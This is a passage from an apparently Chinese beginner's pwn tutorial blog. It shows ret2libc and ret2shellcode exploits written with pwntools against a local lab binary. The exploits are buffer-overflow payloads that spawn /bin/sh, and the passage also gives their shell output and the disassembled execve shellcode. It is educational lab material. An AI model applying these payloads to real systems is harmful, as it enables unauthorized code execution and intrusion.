&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">gdb&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">struct&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">gdb&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">debug&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./question32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">b question.c:13
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">continue
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;/bin/sh&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x42&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">112&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># %ecx, %ebx, %edi, %ebp, &amp;amp;system, &amp;amp;exit, &amp;amp;name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">stack_elem&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mh">0xffffd1c0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xf7dcbcb0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xf7dbe1c0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x804c060&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">struct&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pack&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;IIIIIII&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">stack_elem&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>启动调试，注意到执行到 &lt;code>ret&lt;/code> 时，&lt;code>%esp&lt;/code> 已经是 &lt;code>system&lt;/code> 的地址，并预先填充了 &lt;code>exit&lt;/code> 函数地址作为 &lt;code>system&lt;/code> 函数的返回地址，&lt;code>&amp;quot;/bin/sh&amp;quot;&lt;/code> 字符串的指针作为 &lt;code>system&lt;/code> 函数的参数。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817161537813.png"
width="983"
height="614"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817161537813_hu99c27d78f9ce90295c36750c1d6b5b3e_618877_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817161537813_hu99c27d78f9ce90295c36750c1d6b5b3e_618877_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220817161537813"
class="gallery-image"
data-flex-grow="160"
data-flex-basis="384px"
>&lt;/p>
&lt;p>继续执行。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817161746120.png"
width="1920"
height="1040"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817161746120_hu5696a5cba533ced68cff91d76d71e89a_1615602_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817161746120_hu5696a5cba533ced68cff91d76d71e89a_1615602_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220817161746120"
class="gallery-image"
data-flex-grow="184"
data-flex-basis="443px"
>&lt;/p>
&lt;p>成功取得shell。现在我们把调试器去除，使用 &lt;code>pwn.process&lt;/code> 来启动程序。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">process&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">struct&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./question32&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;/bin/sh&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x42&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">112&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># %ecx, %ebx, %edi, %ebp, &amp;amp;system, &amp;amp;perror, &amp;amp;name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">stack_elem&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mh">0xffffd1c0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xf7dcbcb0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xf7dbe1c0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x804c060&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">struct&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pack&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;IIIIIII&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">stack_elem&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>结果：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">(.venv) vm :: repos/pwn/lab-2 » python exp32.py
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[+] Starting local process &amp;#39;./question32&amp;#39;: pid 146484
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] Switching to interactive mode
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">name: 0x804c060 buffer: 0xffffd13c
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">what&amp;#39;s your name?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Welcome, /bin/sh. Show your hack skill.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ echo $0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>成功。&lt;/p>
&lt;h3 id="ret2shellcode">ret2shellcode&lt;/h3>
&lt;p>这是另一个例子，不同之处在于栈可执行保护没有开启（编译参数 &lt;code>-z execstack&lt;/code>）。其他和上例相同。&lt;/p>
&lt;p>pwntools 提供了一些 shellcode 片段，其中就有用系统调用 &lt;code>execve&lt;/code> 启动 &lt;code>/bin/sh&lt;/code> 的代码。在 &lt;code>ret2libc&lt;/code> 的 &lt;code>exploit&lt;/code> 基础上，我们只用把返回地址修改成 &lt;code>buffer&lt;/code> 的地址，把填充 &lt;code>buffer&lt;/code> 的 &lt;code>\x41&lt;/code> 换成 shellcode 即可。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">gdb&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">shellcraft&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">asm&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">struct&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">gdb&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">debug&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./question32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">b question.c:13
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">continue
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;hacker&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">asm&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">shellcraft&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">i386&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">linux&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sh&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x00&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">112&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># %ecx, %ebx, %edi, %ebp, &amp;amp;buffer&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">stack_elem&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mh">0xffffd1c0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xffffd13c&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">struct&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pack&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;IIIII&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">stack_elem&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在调试器中观察，确认&lt;code>ret&lt;/code>跳转到了&lt;code>&amp;amp;buffer&lt;/code>，将脚本改为 &lt;code>pwn.process&lt;/code> 即可。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817170010162.png"
width="600"
height="258"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817170010162_hu5bebb33353747b29ee3be2f01684cdb4_85729_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220817170010162_hu5bebb33353747b29ee3be2f01684cdb4_85729_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220817170010162"
class="gallery-image"
data-flex-grow="232"
data-flex-basis="558px"
>&lt;/p>
&lt;p>还可以看下 &lt;code>shellcraft.i386.linux.sh&lt;/code> 提供的代码片段长什么样。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> /* execve(path=&amp;#39;/bin///sh&amp;#39;, argv=[&amp;#39;sh&amp;#39;], envp=0) */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /* push b&amp;#39;/bin///sh\x00&amp;#39; */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push 0x68
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push 0x732f2f2f
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push 0x6e69622f
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov ebx, esp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /* push argument array [&amp;#39;sh\x00&amp;#39;] */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /* push &amp;#39;sh\x00\x00&amp;#39; */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push 0x1010101
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xor dword ptr [esp], 0x1016972
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xor ecx, ecx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push ecx /* null terminate */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push 4
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> pop ecx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> add ecx, esp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push ecx /* &amp;#39;sh\x00&amp;#39; */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov ecx, esp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xor edx, edx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /* call execve() */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push SYS_execve /* 0xb */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> pop eax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> int 0x80
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>乍一看有点奇怪，但注意观察汇编后的机器码就会发现这段汇编编译后不包含 &lt;code>\x00&lt;/code>，在 &lt;code>strcpy&lt;/code> 之类的场景下能避免被截断，泛用性更好。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>存在几个问题。&lt;/p>
&lt;ol>
&lt;li>很多保护机制绕过方法没有学。ASLR、PIE、NX、CANARY 等。&lt;/li>
&lt;li>花了很长时间去无谓地算偏移，明明给了 &lt;code>andl -16, %esp&lt;/code> 却不肯看一眼对齐前后 &lt;code>%esp&lt;/code> 怎么变。&lt;/li>
&lt;li>gdb 不熟练，&lt;code>gdb-peda&lt;/code> 真的很好用，绝了。&lt;/li>
&lt;li>还没试过构造 ROP Gadget 链&lt;/li>
&lt;/ol>
&lt;p>各方面都有很大提高空间吧。想找个群什么的有问题不用自己强钻牛角尖。&lt;/p></description></item></channel></rss>